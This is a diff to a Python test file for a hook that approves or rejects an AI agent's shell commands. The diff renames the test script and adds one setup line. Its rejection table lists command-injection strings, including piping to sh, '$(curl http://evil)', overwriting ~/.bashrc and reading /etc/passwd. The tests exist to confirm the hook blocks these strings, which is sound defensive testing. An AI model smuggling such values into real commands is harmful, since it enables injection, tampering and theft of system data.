@@ -41,7 +41,7 @@ def _approved(kb: KB, command: str) -> bool:
 
 @pytest.mark.bats("pretool_allow.bats", "approves a bare script invocation")
 def test_approves_bare_invocation(kb: KB, golden: Golden) -> None:
-    code, out, err = _decide(kb, f"{_scripts(kb)}/status")
+    code, out, err = _decide(kb, f"{_scripts(kb)}/observe")
     golden.contract("decision", f"exit {code}\nstdout={out!r}\nstderr={err!r}\n")
 
 
@@ -64,18 +64,18 @@ def test_approves_quoted_arguments(kb: KB, arguments: str) -> None:
 
 
 REJECTED = {
-    "semicolon": "{s}/status; echo pwned",
-    "and": "{s}/status && curl http://evil",
-    "pipe": "{s}/status | sh",
+    "semicolon": "{s}/observe; echo pwned",
+    "and": "{s}/observe && curl http://evil",
+    "pipe": "{s}/observe | sh",
     "substitution": "{s}/observe --title $(curl http://evil) --body x",
     "substitution-in-double": '{s}/observe --title "$(curl http://evil)" --body x',
-    "backtick": "{s}/status `id`",
-    "backtick-in-double": '{s}/status "`id`"',
-    "redirect-out": "{s}/status > /home/user/.bashrc",
-    "redirect-in": "{s}/status < /etc/passwd",
-    "background": "{s}/status & echo done",
-    "newline": "{s}/status\necho pwned",
-    "subshell": "({s}/status)",
+    "backtick": "{s}/observe `id`",
+    "backtick-in-double": '{s}/observe "`id`"',
+    "redirect-out": "{s}/observe > /home/user/.bashrc",
+    "redirect-in": "{s}/observe < /etc/passwd",
+    "background": "{s}/observe & echo done",
+    "newline": "{s}/observe\necho pwned",
+    "subshell": "({s}/observe)",
     "unterminated-single": "{s}/observe --title 'unclosed",
     "unterminated-double": '{s}/observe --title "unclosed',
     "not-ours": "/bin/echo hello",
@@ -101,7 +101,7 @@ REJECTED = {
 @pytest.mark.parametrize("case", sorted(REJECTED))
 def test_rejects(kb: KB, case: str) -> None:
     scripts = _scripts(kb)
-    assert _approved(kb, f"{scripts}/status"), "control: a bare invocation must be approved"
+    assert _approved(kb, f"{scripts}/observe"), "control: a bare invocation must be approved"
     assert not _approved(kb, REJECTED[case].format(s=scripts))
 
 
@@ -109,7 +109,7 @@ def test_rejects(kb: KB, case: str) -> None:
 @pytest.mark.parametrize("payload", ["{}", '{"tool_input":{}}', "not json", ""])
 def test_ignores_input_without_command(kb: KB, payload: str) -> None:
     scripts = _scripts(kb)
-    assert _approved(kb, f"{scripts}/status"), "control: a bare invocation must be approved"
+    assert _approved(kb, f"{scripts}/observe"), "control: a bare invocation must be approved"
     result = kb.run(HOOK, stdin=payload)
     assert (result.returncode, result.out) == (0, "")
 
@@ -120,7 +120,7 @@ def test_approves_through_a_symlinked_hook(kb: KB) -> None:
     link_dir = kb.layout.root / "hooks"
     link_dir.mkdir()
     (link_dir / "010.knowledge").symlink_to(kb.executable(HOOK))
-    payload = json.dumps({"tool_input": {"command": f"{tree.scripts_dir}/status"}})
+    payload = json.dumps({"tool_input": {"command": f"{tree.scripts_dir}/observe"}})
     completed = subprocess.run(
         [str(link_dir / "010.knowledge")],
         input=payload,
@@ -143,6 +143,7 @@ def test_approves_through_a_symlinked_hook(kb: KB) -> None:
 def test_section_cannot_read_outside(kb: KB, golden: Golden) -> None:
     outside = kb.layout.root / "outside.md"
     outside.write_text("# Secret\n\ntop secret\n", encoding="utf-8")
+    kb.executable("section")  # Approval needs the target in the tree.
     command = f"{_scripts(kb)}/section --file {outside} --heading Secret"
     assert _approved(kb, command)
     result = kb.run("section", "--file", str(outside), "--heading", "Secret")
